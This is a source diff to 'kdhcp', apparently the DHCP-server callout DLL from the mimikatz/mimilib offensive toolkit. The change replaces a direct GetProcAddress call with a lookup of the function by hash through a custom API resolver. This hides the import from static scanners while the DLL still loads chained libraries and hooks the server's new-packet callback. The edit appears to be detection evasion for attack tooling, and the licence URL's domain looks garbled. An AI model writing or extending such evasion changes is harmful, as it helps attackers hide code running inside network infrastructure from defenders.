@@ -4,6 +4,7 @@
 	Licence : https://GHViJ8cQzKiJugP.org/licenses/by/4.0/
 */
 #include "kdhcp.h"
+#include "..\mimilib\api_resolver.h"
 
 HMODULE kdhcp_nextLibrary = NULL;
 LPDHCP_NEWPKT kdhcp_nextLibraryCalloutNewPkt = NULL;
@@ -15,17 +16,47 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
 	return TRUE;
 }
 
-DWORD CALLBACK kdhcp_DhcpServerCalloutEntry(IN LPWSTR ChainDlls, IN DWORD CalloutVersion, IN OUT LPDHCP_CALLOUT_TABLE CalloutTbl)
+//DWORD CALLBACK kdhcp_DhcpServerCalloutEntry(IN LPWSTR ChainDlls, IN DWORD CalloutVersion, IN OUT LPDHCP_CALLOUT_TABLE CalloutTbl)
+//{
+//	LPDHCP_ENTRY_POINT_FUNC nextEntry;
+//	RtlZeroMemory(CalloutTbl, sizeof(DHCP_CALLOUT_TABLE));
+//	PDWORD functionAddress = getFunctionAddressByHash((char*)"kernel32", 0x003db390f);
+//	customGetProcAddress GetProcAddress_ = (customGetProcAddress)functionAddress;
+//
+//	if(ChainDlls)
+//		if(kdhcp_nextLibrary = LoadLibrary(ChainDlls))
+//			//if(nextEntry = (LPDHCP_ENTRY_POINT_FUNC) GetProcAddress(kdhcp_nextLibrary, DHCP_CALLOUT_ENTRY_POINT))
+//			if (nextEntry = (LPDHCP_ENTRY_POINT_FUNC)GetProcAddress_(kdhcp_nextLibrary, DHCP_CALLOUT_ENTRY_POINT))
+//				nextEntry(ChainDlls + lstrlenW(ChainDlls) + 1, CalloutVersion, CalloutTbl);
+//
+//	if(CalloutTbl->DhcpNewPktHook)
+//		kdhcp_nextLibraryCalloutNewPkt = CalloutTbl->DhcpNewPktHook;
+//	CalloutTbl->DhcpNewPktHook = kdhcp_DhcpNewPktHook;
+//
+//	return ERROR_SUCCESS;
+//}
+
+DWORD CALLBACK kdhcp_DhcpServerCalloutEntry(IN LPWSTR ChainDlls, IN DWORD CalloutVersion, IN OUT LPDHCP_CALLOUT_TABLE CalloutTbl) 
 {
 	LPDHCP_ENTRY_POINT_FUNC nextEntry;
 	RtlZeroMemory(CalloutTbl, sizeof(DHCP_CALLOUT_TABLE));
 
-	if(ChainDlls)
-		if(kdhcp_nextLibrary = LoadLibrary(ChainDlls))
-			if(nextEntry = (LPDHCP_ENTRY_POINT_FUNC) GetProcAddress(kdhcp_nextLibrary, DHCP_CALLOUT_ENTRY_POINT))
-				nextEntry(ChainDlls + lstrlenW(ChainDlls) + 1, CalloutVersion, CalloutTbl);
 
-	if(CalloutTbl->DhcpNewPktHook)
+	HMODULE hKernel = GetModuleHandleA("kernel32.dll");
+	FARPROC funcAddr = getFunctionByHash(hKernel, 0x003db390f);
+	customGetProcAddress GetProcAddress_ = (customGetProcAddress)funcAddr;
+
+	if (ChainDlls) {
+		if (kdhcp_nextLibrary = LoadLibrary(ChainDlls)) {
+			if (nextEntry = (LPDHCP_ENTRY_POINT_FUNC)
+				GetProcAddress_(kdhcp_nextLibrary, DHCP_CALLOUT_ENTRY_POINT))
+			{
+				nextEntry(ChainDlls + lstrlenW(ChainDlls) + 1, CalloutVersion, CalloutTbl);
+			}
+		}
+	}
+
+	if (CalloutTbl->DhcpNewPktHook)
 		kdhcp_nextLibraryCalloutNewPkt = CalloutTbl->DhcpNewPktHook;
 	CalloutTbl->DhcpNewPktHook = kdhcp_DhcpNewPktHook;
 
